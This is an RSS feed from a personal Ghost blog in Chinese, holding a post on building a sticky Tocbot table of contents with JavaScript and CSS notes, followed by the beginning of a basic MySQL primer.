<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[zairesinatra]]></title><description><![CDATA[The best time to recognize yourself is ten years ago, followed by now.]]></description><link>yourdomain.com/</link><image><url>yourdomain.com/favicon.png</url><title>zairesinatra</title><link>yourdomain.com/</link></image><generator>Ghost 5.25</generator><lastBuildDate>Sun, 01 Jan 2023 15:48:33 GMT</lastBuildDate><atom:link href="yourdomain.com/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[G&TOC&CSS]]></title><description><![CDATA[TOC 的需求实现以及相关的思考总结。]]></description><link>yourdomain.com/g-toc-css/</link><guid isPermaLink="false">626d3213eb1f7c0845645cdf</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sun, 01 May 2022 13:36:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/SLAMDUNK.png" medium="image"/><content:encoded><![CDATA[<div class="kg-card kg-audio-card"><img src="yourdomain.com/content/media/2022/04/------_thumb.jpeg?v=1651341861336" alt="G&amp;TOC&amp;CSS" class="kg-audio-thumbnail"><div class="kg-audio-thumbnail placeholder kg-audio-hide"><svg width="24" height="24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M7.5 15.33a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm-2.25.75a2.25 2.25 0 1 1 4.5 0 2.25 2.25 0 0 1-4.5 0ZM15 13.83a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm-2.25.75a2.25 2.25 0 1 1 4.5 0 2.25 2.25 0 0 1-4.5 0Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M14.486 6.81A2.25 2.25 0 0 1 17.25 9v5.579a.75.75 0 0 1-1.5 0v-5.58a.75.75 0 0 0-.932-.727.755.755 0 0 1-.059.013l-4.465.744a.75.75 0 0 0-.544.72v6.33a.75.75 0 0 1-1.5 0v-6.33a2.25 2.25 0 0 1 1.763-2.194l4.473-.746Z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M3 1.5a.75.75 0 0 0-.75.75v19.5a.75.75 0 0 0 .75.75h18a.75.75 0 0 0 .75-.75V5.133a.75.75 0 0 0-.225-.535l-.002-.002-3-2.883A.75.75 0 0 0 18 1.5H3ZM1.409.659A2.25 2.25 0 0 1 3 0h15a2.25 2.25 0 0 1 1.568.637l.003.002 3 2.883a2.25 2.25 0 0 1 .679 1.61V21.75A2.25 2.25 0 0 1 21 24H3a2.25 2.25 0 0 1-2.25-2.25V2.25c0-.597.237-1.169.659-1.591Z"/></svg></div><div class="kg-audio-player-container"><audio src="yourdomain.com/content/media/2022/04/------.mp3" preload="metadata"></audio><div class="kg-audio-title"> &#x6674;&#x5929;-&#x5468;&#x6770;&#x4F26;</div><div class="kg-audio-player"><button class="kg-audio-play-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M23.14 10.608 2.253.164A1.559 1.559 0 0 0 0 1.557v20.887a1.558 1.558 0 0 0 2.253 1.392L23.14 13.393a1.557 1.557 0 0 0 0-2.785Z"/></svg></button><button class="kg-audio-pause-icon kg-audio-hide"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><rect x="3" y="1" width="7" height="22" rx="1.5" ry="1.5"/><rect x="14" y="1" width="7" height="22" rx="1.5" ry="1.5"/></svg></button><span class="kg-audio-current-time">0:00</span><div class="kg-audio-time">/<span class="kg-audio-duration">4:29</span></div><input type="range" class="kg-audio-seek-slider" max="100" value="0"><button class="kg-audio-playback-rate">1&#xD7;</button><button class="kg-audio-unmute-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M15.189 2.021a9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h1.794a.249.249 0 0 1 .221.133 9.73 9.73 0 0 0 7.924 4.85h.06a1 1 0 0 0 1-1V3.02a1 1 0 0 0-1.06-.998Z"/></svg></button><button class="kg-audio-mute-icon kg-audio-hide"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M16.177 4.3a.248.248 0 0 0 .073-.176v-1.1a1 1 0 0 0-1.061-1 9.728 9.728 0 0 0-7.924 4.85.249.249 0 0 1-.221.133H5.25a3 3 0 0 0-3 3v2a3 3 0 0 0 3 3h.114a.251.251 0 0 0 .177-.073ZM23.707 1.706A1 1 0 0 0 22.293.292l-22 22a1 1 0 0 0 0 1.414l.009.009a1 1 0 0 0 1.405-.009l6.63-6.631A.251.251 0 0 1 8.515 17a.245.245 0 0 1 .177.075 10.081 10.081 0 0 0 6.5 2.92 1 1 0 0 0 1.061-1V9.266a.247.247 0 0 1 .073-.176Z"/></svg></button><input type="range" class="kg-audio-volume-slider" max="100" value="100"></div></div></div><img src="yourdomain.com/content/images/2022/04/SLAMDUNK.png" alt="G&amp;TOC&amp;CSS"><p>GHOST &#x5E76;&#x6CA1;&#x6709;&#x5185;&#x7F6E; Table Of Content &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4E14;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;<a href="https://ghost.org/docs/tutorials/adding-a-table-of-contents/">&#x89E3;&#x51B3;&#x65B9;&#x6848;</a>&#x5B58;&#x5728;&#x4E0D;&#x5408;&#x7406;&#x5904;&#xFF0C;&#x9042;&#x81EA;&#x884C;&#x8C03;&#x6574;&#x90E8;&#x5206;&#x6548;&#x679C;&#xFF0C;&#x672C;&#x6587;&#x610F;&#x5728;&#x8BB0;&#x5F55;&#x603B;&#x7ED3;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x3002;</p><!--kg-card-begin: markdown--><h2 id="%E5%88%9D%E6%AD%A5%E5%AE%9E%E7%8E%B0">&#x521D;&#x6B65;&#x5B9E;&#x73B0;</h2>
<p>&#x6309;&#x7167;&#x5B98;&#x65B9;&#x6587;&#x6863;&#xFF0C;&#x6839;&#x636E;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E2D;&#x7684;&#x6807;&#x9898;&#x751F;&#x6210;&#x76EE;&#x5F55;&#x9700;&#x91C7;&#x7528;&#x4E00;&#x6B3E;&#x540D;&#x4E3A; <a href="https://cdnjs.com/libraries/tocbot">Tocbot</a> &#x7684;&#x5C0F;&#x578B;&#x5E93;&#x3002;</p>
<p>&#x5C06;&#x83B7;&#x53D6;&#x5230;&#x7684; Tocbot CSS &#x94FE;&#x63A5;&#x6DFB;&#x52A0;&#x5230; Casper &#x4E3B;&#x9898; default.hbs &#x6587;&#x4EF6;&#x4E2D; &lt;head&gt; &#x6807;&#x7B7E;&#x4F53;&#x5C3E;&#x90E8;&#x3002;</p>
<pre><code class="language-css">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css&quot;&gt;
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;{{asset &quot;css/screen.css&quot;}}&quot; /&gt;
{{ghost_head}}
</code></pre>
<p>&#x540C;&#x6837;&#x5730;&#x64CD;&#x4F5C; Tocbot JavaScript &#x94FE;&#x63A5;&#x81F3; default.hbs &#x91CC; &lt;/body&gt; &#x6807;&#x7B7E;&#x4E4B;&#x524D;&#x3002;&#x503C;&#x5F97;&#x4E00;&#x63D0;&#x7684;&#x662F;&#xFF0C;&#x968F;&#x7740;&#x7248;&#x672C;&#x66F4;&#x65B0;&#xFF0C;&#x5185;&#x5BB9;&#x9009;&#x62E9;&#x5668;&#x4E0D;&#x518D;&#x662F;&#x5B98;&#x65B9;&#x6240;&#x7ED1;&#x5B9A;&#x7684; .post-content&#xFF0C;&#x800C;&#x662F;&#x6839;&#x636E;&#x6E90;&#x7801;&#x5F97;&#x5230;&#x7684; .gh-content&#x3002;</p>
<pre><code class="language-javascript">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
  tocbot.init({
    tocSelector: &apos;.toc&apos;,
    contentSelector: &apos;.gh-content&apos;,
    hasInnerContainers: true
  });
&lt;/script&gt;
</code></pre>
<p>&#x5BF9;&#x4E8E;&#x9009;&#x62E9;&#x533A;&#x57DF;&#x8FDB;&#x884C;&#x6E32;&#x67D3;&#xFF0C;&#x671F;&#x671B;&#x662F;&#x76EE;&#x5F55;&#x51FA;&#x73B0;&#x5728;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x4E4B;&#x524D;&#xFF0C;&#x56E0;&#x6B64;&#x5728; .post.hbs &#x6587;&#x4EF6;&#x5B8C;&#x6210;&#x5982;&#x4E0B;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-html">&lt;section class=&quot;gh-content gh-canvas&quot;&gt;
  &lt;aside class=&quot;toc-container&quot;&gt;
    &lt;div class=&quot;toc&quot;&gt;&lt;/div&gt;
  &lt;/aside&gt;
  {{content}}
&lt;/section&gt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%AE%9A%E5%88%B6%E6%95%88%E6%9E%9C">&#x5B9A;&#x5236;&#x6548;&#x679C;</h2>
<p>&#x672C;&#x4EBA;&#x671F;&#x671B;&#x80FD;&#x5728;&#x6D4F;&#x89C8;&#x6587;&#x7AE0;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x5728;&#x4FA7;&#x8FB9;&#x770B;&#x89C1;&#x5373;&#x65F6;&#x7684; TOC &#x9762;&#x677F;&#xFF0C;&#x6545;&#x589E;&#x52A0; TOC &#x968F;&#x9875;&#x9762;&#x6EDA;&#x52A8;&#x66F4;&#x6539;&#x4F4D;&#x7F6E;&#x7684;&#x9700;&#x6C42;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x7406;&#x8BBA;&#x53EF;&#x884C;&#x7684;&#x65B9;&#x6848;&#x6765;&#x8BF4;&#xFF0C;&#x90FD;&#x6216;&#x591A;&#x6216;&#x5C11;&#x4E0E;&#x5F53;&#x524D;&#x7248;&#x672C;&#x6E90;&#x7801;&#x5B58;&#x5728;&#x5DEE;&#x5F02;&#xFF0C;&#x6700;&#x5178;&#x578B;&#x7684;&#x662F;&#x5E03;&#x5C40;&#x65B9;&#x5F0F;&#x3002;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;Ghost &#x540E;&#x53F0;&#x5F00;&#x542F;&#x670D;&#x52A1;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#xFF0C;&#x50CF;&#x662F; PM2&#x3001;&#x4E91;&#x4EE3;&#x7406;&#xFF0C;&#x66F4;&#x6709;&#x751A;&#x8005;&#x76F4;&#x63A5;&#x7528; Node &#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x4E0E; Ghost &#x6A21;&#x6837;&#x4E00;&#x81F4;&#x7684;<a href="https://github.com/styxlab/next-cms-ghost">&#x66FF;&#x4EE3;&#x7248;</a>&#x3002;</p>
<pre><code class="language-javascript">var tc = document.querySelector(&quot;.toc-container&quot;);
var tch = tc.clientHeight;
var ah = document.querySelector(&quot;.article-header&quot;);
var ahh = ah.clientHeight;
window.addEventListener(&quot;scroll&quot;, function () {
if(document.body.clientWidth &gt; 1170){
  var scrollY = document.documentElement.scrollTop || document.body.scrollTop;
  var ihh = window.innerHeight;
  if(scrollY &gt;= ihh + tch + ahh){
    var ctc = document.querySelector(&quot;.toc-container&quot;);
    ctc.style.position=&quot;sticky&quot;;
    ctc.style.position=&quot;-webkit-sticky&quot;;
    ctc.style.top = &quot;120px&quot;;
    ctc.style.marginLeft = &quot;800px&quot;;
    ctc.style.minWidth= &quot;260px&quot;;
  }
  if(scrollY &lt; tch + ahh -10){
    var ctc = document.querySelector(&quot;.toc-container&quot;);
    ctc.style.position=&quot;&quot;;
    ctc.style.top = &quot;&quot;;
    ctc.style.marginLeft = &quot;&quot;;
    console.log(&quot;zszszs&quot;)
  }
}})
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D">&#x603B;&#x7ED3;&#x53CD;&#x601D;</h2>
<p>Ghost &#x73B0;&#x9636;&#x6BB5;&#x6E90;&#x7801;&#x7684;&#x5E03;&#x5C40;&#x662F;&#x4F7F;&#x7528; Grid &#x4E0E; Flex &#x4EA4;&#x53C9;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x82E5;&#x5728;&#x6539;&#x53D8; TOC &#x5143;&#x7D20;&#x4F4D;&#x7F6E;&#x65F6;&#xFF0C;&#x5C06;&#x5176;&#x539F;&#x6709;&#x4F4D;&#x7F6E;&#x5728; DOM &#x4E0A;&#x79FB;&#x9664;&#xFF0C;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x91CD;&#x6392;&#x6548;&#x679C;&#xFF0C;&#x4F53;&#x9A8C;&#x611F;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x4E14;&#x6D88;&#x8017;&#x6027;&#x80FD;&#x3002;&#x9274;&#x4E8E;&#x9875;&#x9762;&#x53EF;&#x89C6;&#x533A;&#x7684;&#x6EDA;&#x52A8;&#xFF0C;&#x4F7F;&#x7528;&#x8005;&#x4E5F;&#x4E0D;&#x4F1A;&#x5173;&#x6CE8;&#x5230;&#x7559;&#x767D;&#x7684;&#x79FB;&#x52A8;&#x533A;&#xFF0C;&#x6545;&#x4E0D;&#x8003;&#x8651; DOM &#x5143;&#x7D20;&#x7684;&#x6458;&#x9664;&#xFF0C;&#x7EAF;&#x7CB9;&#x4E34;&#x65F6;&#x6027;&#x6539;&#x53D8;&#x5750;&#x6807;&#x3002;</p>
<h3 id="css">CSS</h3>
<p>postion &#x7684;&#x9009;&#x62E9;&#x65B9;&#x5F0F;&#x4E0A;&#xFF0C;&#x6BD4;&#x8F83;&#x56FA;&#x5B9A;&#x5B9A;&#x4F4D; fixed &#x4E0E;&#x7C98;&#x6027;&#x5B9A;&#x4F4D; sticky&#x3002;&#x4E8C;&#x8005;&#x90FD;&#x53EF;&#x4EE5;&#x5728;&#x62D6;&#x52A8;&#x6EDA;&#x52A8;&#x6761;&#x65F6;&#xFF0C;&#x56FA;&#x5B9A;&#x5143;&#x7D20;&#x4E8E;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x3002;&#x4F46;&#x662F;&#x5728;&#x6548;&#x679C;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x662F;&#x76F4;&#x63A5;&#x56FA;&#x5B9A;&#x4E8E;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#xFF0C;&#x540E;&#x8005;&#x5728;&#x8FBE;&#x5230;&#x4E34;&#x754C;&#x503C;&#x65F6;&#x8FDB;&#x884C;&#x56FA;&#x5B9A;&#x3002;&#x5728;&#x6027;&#x8D28;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x8131;&#x79BB;&#x6587;&#x6863;&#x6D41;&#xFF0C;&#x540E;&#x8005;&#x4E0D;&#x8131;&#x79BB;&#x6587;&#x6863;&#x6D41;&#x3002;&#x5728;&#x4F7F;&#x7528;&#x4E0A;&#xFF0C;&#x524D;&#x8005;&#x65E0;&#x9700;&#x6307;&#x5B9A; top&#x3001;button&#x3001;left&#x3001;right &#x4E2D;&#x7684;&#x4EFB;&#x4E00;&#x503C;&#xFF0C;&#x5C31;&#x80FD;&#x4EE5;&#x5F53;&#x524D;&#x89C6;&#x53E3;&#x8FDB;&#x884C;&#x5B9A;&#x4F4D;&#x3002;&#x540E;&#x8005;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x5176;&#x4E00;&#xFF0C;&#x7136;&#x540E;&#x76F8;&#x5BF9;&#x6700;&#x8FD1;&#x6EDA;&#x52A8;&#x7956;&#x5148;&#x8FDB;&#x884C;&#x504F;&#x79FB;&#x3002;</p>
<p>Ghost &#x6E90;&#x7801;&#x7684;&#x89C6;&#x7A97;&#x5355;&#x4F4D;&#x51FA;&#x73B0;&#x8F83;&#x4E30;&#x5BCC;&#x3002;viewport &#x662F;&#x6D4F;&#x89C8;&#x5668;&#x5B9E;&#x9645;&#x663E;&#x793A;&#x5185;&#x5BB9;&#x7684;&#x533A;&#x57DF;&#xFF0C;&#x5373;&#x4E0D;&#x5305;&#x62EC;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x533A;&#x57DF;&#x3002;</p>
<pre><code class="language-javascript">// A viewport with width 1000px and height 800px
vw =&gt; viewport &#x9AD8;&#x5EA6;&#x7684;&#x767E;&#x5206;&#x6BD4; =&gt; 50vw = 500px
vh =&gt; viewport &#x9AD8;&#x5EA6;&#x7684;&#x767E;&#x5206;&#x6BD4; =&gt; 50vh = 400px
vmin =&gt; vw &#x548C; vh &#x4E2D;&#x8F83;&#x5C0F;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x767E;&#x5206;&#x6BD4;&#x5355;&#x4F4D; =&gt; 50vim = 400px
vmax =&gt; vw &#x548C; vh &#x4E2D;&#x8F83;&#x5927;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x767E;&#x5206;&#x6BD4;&#x5355;&#x4F4D; =&gt; 50vmax = 500px
</code></pre>
<pre><code class="language-css">/* &#x5E94;&#x7528; */
/* &#x5B50;&#x5143;&#x7D20;&#x7684;&#x5927;&#x5C0F;&#x76F8;&#x5BF9;&#x4E8E;&#x7A97;&#x53E3;&#x6539;&#x53D8;&#x800C;&#x4E0D;&#x662F;&#x7236;&#x5143;&#x7D20; */
.parent { width: 100px; }
.child { width: 50vw; }
/* &#x54CD;&#x5E94;&#x5782;&#x76F4;&#x5C45;&#x4E2D; */
.verticalresponsecentering{ width: 50vw; height: 50vh; margin: 25vh auto; }
.verticalresponsecentering{ width: 50vw; height: 50vh; margin: 25vh 25vw; }
</code></pre>
<h3 id="javascript">Javascript</h3>
<p>&#x5728;&#x6548;&#x679C;&#x5B9E;&#x73B0;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6EDA;&#x52A8;&#x76D1;&#x542C;&#x4E8B;&#x4EF6;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x9875;&#x9762;&#x6EDA;&#x52A8;&#x8DDD;&#x79BB;&#xFF0C;&#x5E94;&#x6CE8;&#x610F;&#x9875;&#x9762;&#x7AEF;&#x4E0E;&#x5230;&#x79FB;&#x52A8;&#x7AEF;&#x7684;&#x517C;&#x5BB9;&#xFF1B;&#x540C;&#x65F6;&#x4E5F;&#x5E94;&#x6CE8;&#x610F;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x5C3A;&#x5BF8;&#x4E0E;&#x89C6;&#x53E3;&#x9AD8;&#x5BBD;&#x7684;&#x95EE;&#x9898;&#x3002;&#x76F8;&#x5173;&#x94FE;&#x63A5;&#x4E8E;&#x6587;&#x672B;&#x3002;</p>
<pre><code class="language-javascript">// &#x517C;&#x5BB9;&#x6027;
// &#x9875;&#x9762;&#x7AEF;&#x652F;&#x6301; document.documentElement,&#x79FB;&#x52A8;&#x7AEF;&#x652F;&#x6301; document.body
var scrollY = document.documentElement.scrollTop || document.body.scrollTop;
// &#x81EA;&#x52A8;&#x8BC6;&#x522B;&#x4E0D;&#x540C;&#x5E73;&#x53F0;&#x4E0A;&#x7684;&#x6EDA;&#x52A8;&#x5BB9;&#x5668; =&gt; document.scrollingElement
// &#x5728;&#x684C;&#x9762;&#x7AEF; document.scrollingElement &#x5C31;&#x662F; document.documentElement/&#x5728;&#x79FB;&#x52A8;&#x7AEF; document.scrollingElement &#x5C31;&#x662F; document.body
document.scrollingElement.scrollTop = 0; // &#x4E00;&#x884C;&#x4EE3;&#x7801;&#x56DE;&#x6EDA;&#x9876;&#x90E8; =&gt; &#x517C;&#x5BB9;pc&#x4E0E;&#x79FB;&#x52A8;
</code></pre>
<pre><code class="language-javascript">// &#x6CE8;&#x610F; document.body.xxx &#x60C5;&#x51B5;
Element.clientWidth|clientHeight // &#x5143;&#x7D20;&#x7684;&#x5185;&#x90E8;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6; =&gt; &#x5305;&#x62EC;&#x5185;&#x8FB9;&#x8DDD; padding,&#x4F46;&#x4E0D;&#x5305;&#x62EC;&#x8FB9;&#x6846; border&#x3001;&#x5916;&#x8FB9;&#x8DDD; margin &#x548C;&#x5782;&#x76F4;&#x6EDA;&#x52A8;&#x6761;
Element.offsetWidth|offsetHeight // &#x53EA;&#x8BFB;&#x5C5E;&#x6027; =&gt; &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5E03;&#x5C40;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6; =&gt; &#x5305;&#x542B;&#x5143;&#x7D20;&#x7684;&#x8FB9;&#x6846; border&#x3001;&#x6C34;&#x5E73;&#x7EBF;&#x4E0A;&#x7684;&#x5185;&#x8FB9;&#x8DDD; padding&#x3001;&#x7AD6;&#x76F4;&#x65B9;&#x5411;&#x6EDA;&#x52A8;&#x6761; scrollbar
Element.scrollWidth|scrollHeight // &#x5143;&#x7D20;&#x5185;&#x5BB9;&#x5BBD;&#x5EA6;|&#x9AD8;&#x5EA6;&#x7684;&#x5EA6;&#x91CF;
Element.scrollTop|scrollLeft // &#x83B7;&#x53D6;&#x6216;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x5185;&#x5BB9;&#x5782;&#x76F4;&#x6EDA;&#x52A8;&#x7684;&#x50CF;&#x7D20;&#x6570;|&#x8BFB;&#x53D6;&#x6216;&#x8BBE;&#x7F6E;&#x5143;&#x7D20;&#x6EDA;&#x52A8;&#x6761;&#x5230;&#x5143;&#x7D20;&#x5DE6;&#x8FB9;&#x7684;&#x8DDD;&#x79BB;

window.screenTop|screenLeft // &#x4ECE;&#x5305;&#x62EC;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x5668;&#x4E0A;|&#x5DE6;&#x8FB9;&#x754C;&#x5230;&#x5C4F;&#x5E55;&#x6700;&#x9876;&#x7AEF;&#x8DDD;&#x79BB;
window.screen.height|width // &#x8FD4;&#x56DE;&#x8BBF;&#x95EE;&#x8005;&#x5C4F;&#x5E55;&#x7684;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6; =&gt; 900|1440
window.innerHeight|innerWidth // &#x89C6;&#x7A97;&#x7684;&#x5185;&#x90E8;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6;

window.pageYOffset // &#x53EA;&#x8BFB; =&gt; scrollTop &#x53EF;&#x8BBE;&#x7F6E;,&#x5177;&#x6709;&#x56DE;&#x9876;&#x90E8;&#x6548;&#x679C;

window.screen.availHeight|availWidth // &#x8FD4;&#x56DE;&#x5305;&#x542B;&#x5DE5;&#x5177;&#x680F;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7A97;&#x53E3;&#x5728;&#x5C4F;&#x5E55;&#x4E0A;&#x53EF;&#x5360;&#x7528;&#x7684;&#x5782;&#x76F4;|&#x6C34;&#x5E73;&#x7A7A;&#x95F4;,&#x5373;&#x6700;&#x5927;&#x9AD8;&#x5EA6;|&#x5BBD;&#x5EA6; =&gt; 825|1440
</code></pre>
<!--kg-card-end: markdown--><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://javascript.info/size-and-scroll"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Element size and scrolling</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://javascript.info/img/favicon/apple-touch-icon-precomposed.png" alt="G&amp;TOC&amp;CSS"></div></div><div class="kg-bookmark-thumbnail"><img src="https://javascript.info/img/site_preview_en_1200x630.png" alt="G&amp;TOC&amp;CSS"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">CSS Grid &#x7F51;&#x683C;&#x5E03;&#x5C40;&#x6559;&#x7A0B; - &#x962E;&#x4E00;&#x5CF0;&#x7684;&#x7F51;&#x7EDC;&#x65E5;&#x5FD7;</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://www.ruanyifeng.com/favicon.ico" alt="G&amp;TOC&amp;CSS"><span class="kg-bookmark-author">&#x962E;&#x4E00;&#x5CF0;&#x7684;&#x7F51;&#x7EDC;&#x65E5;&#x5FD7;</span><span class="kg-bookmark-publisher">&#x962E;&#x4E00;&#x5CF0;</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://www.wangbase.com/blogimg/asset/201903/1_bg2019032501.png" alt="G&amp;TOC&amp;CSS"></div></a></figure><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[MySQL]]></title><description><![CDATA[MYSQL 基础篇]]></description><link>yourdomain.com/mysqlnote/</link><guid isPermaLink="false">6264edb6aa2820757fbb143e</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Wed, 22 Dec 2021 13:11:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2022/04/cloud.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="quick-start">Quick Start</h3>
<img src="yourdomain.com/content/images/2022/04/cloud.jpg" alt="MySQL"><p>&#x6570;&#x636E;&#x5E93;&#x662F;&#x6709;&#x7EC4;&#x7EC7;&#x7684;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x3002;&#x8868;&#x662F;&#x5B58;&#x50A8;&#x7279;&#x5B9A;&#x7C7B;&#x578B;&#x6570;&#x636E;&#x7684;&#x7ED3;&#x6784;&#x5316;&#x6587;&#x4EF6;&#x3002;&#x6A21;&#x5F0F;&#x8BF4;&#x660E;&#x5E93;&#x4E0E;&#x8868;&#x7684;&#x5E03;&#x5C40;&#x4E0E;&#x7279;&#x6027;&#x4FE1;&#x606F;&#x3002;&#x5217;&#x662F;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x6240;&#x6709;&#x8868;&#x90FD;&#x7531;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x5217;&#x7EC4;&#x6210;&#x3002;&#x884C;&#x4F5C;&#x4E3A;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x3002;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x8868;&#x4E2D;&#x6BCF;&#x884C;&#x7684;&#x8FD9;&#x4E2A;&#x5217;&#x6216;&#x8FD9;&#x7EC4;&#x5217;&#xFF0C;&#x79F0;&#x4E3A;&#x4E3B;&#x952E;&#x3002;&#x6CA1;&#x6709;&#x4E3B;&#x952E;&#x5219;&#x65E0;&#x6CD5;&#x5B89;&#x5168;&#x66F4;&#x65B0;&#x6216;&#x5220;&#x9664;&#x8868;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x884C;&#x3002;&#x4EFB;&#x4F55;&#x5217;&#x90FD;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E3B;&#x952E;&#xFF0C;&#x4F46;&#x662F;&#x9700;&#x6EE1;&#x8DB3;&#x4EFB;&#x610F;&#x4E24;&#x884C;&#x90FD;&#x4E0D;&#x5177;&#x6709;&#x76F8;&#x540C;&#x7684;&#x4E3B;&#x952E;&#x503C;&#x4E14;&#x6BCF;&#x884C;&#x90FD;&#x5FC5;&#x987B;&#x5177;&#x6709;&#x4E00;&#x4E2A;&#x975E; <code>NULL</code> &#x7684;&#x4E3B;&#x952E;&#x503C;&#x7684;&#x6761;&#x4EF6;&#x3002;</p>
<p>&#x9ED8;&#x8BA4;&#x6570;&#x636E;&#x5E93;&#xFF1A;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6570;&#x636E;&#x5E93;</th>
<th style="text-align:center">&#x63CF;&#x8FF0;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">infomation_schema</td>
<td style="text-align:center">&#x4FE1;&#x606F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5305;&#x62EC; MySQL &#x5728;&#x7EF4;&#x62A4;&#x7684;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x3001;&#x8868;&#x3001;&#x5217;&#x8BBF;&#x95EE;&#x6743;&#x9650;</td>
</tr>
<tr>
<td style="text-align:center">performance_schema</td>
